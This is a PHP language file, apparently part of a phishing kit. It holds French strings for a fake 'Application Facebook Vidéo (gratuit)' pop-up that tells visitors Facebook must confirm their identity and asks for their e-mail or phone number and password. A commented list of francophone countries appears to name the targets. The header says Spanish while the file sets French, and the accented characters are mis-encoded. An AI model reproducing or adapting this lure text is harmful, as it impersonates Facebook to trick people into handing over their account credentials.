<?php
/*
-----------------
Idioma: Espanol
-----------------
*/
 
$lang = array();
 
// General

$lang['LANG'] = 'fr';
 
// Fondo

$lang['TITULO_PAGINA'] = 'Application Facebook';

// Pop-UP
 
$lang['POPUP_TITULO'] = 'Application Facebook Vid�o (gratuit)';
$lang['POPUP_DESCRIPCION'] = 'Facebook doit confirmer les informations suivantes pour permettre l\'acc�s � cette application vid�os, Identifiez-vous!';
$lang['POPUP_CORREO'] = 'Adresse e-mail ou mobile';
$lang['POPUP_CONTRASENA'] = 'Mot de passe';
$lang['POPUP_SUBMIT'] = 'Connexion';
$lang['POPUP_CANDADO'] = 'Cette application est interdit de publier sur Facebook.';

/*
array("France", "Monaco", "Benin", "Burkina Faso", "Congo The Democratic Republic of The", "Congo", "Gabon", "Guinea", "Mali", "Niger", "Reunion", "Togo", "Martinique", "Saint Martin", "French Polynesia", "New Caledonia", "Wallis and Futuna", "French Guiana")
*/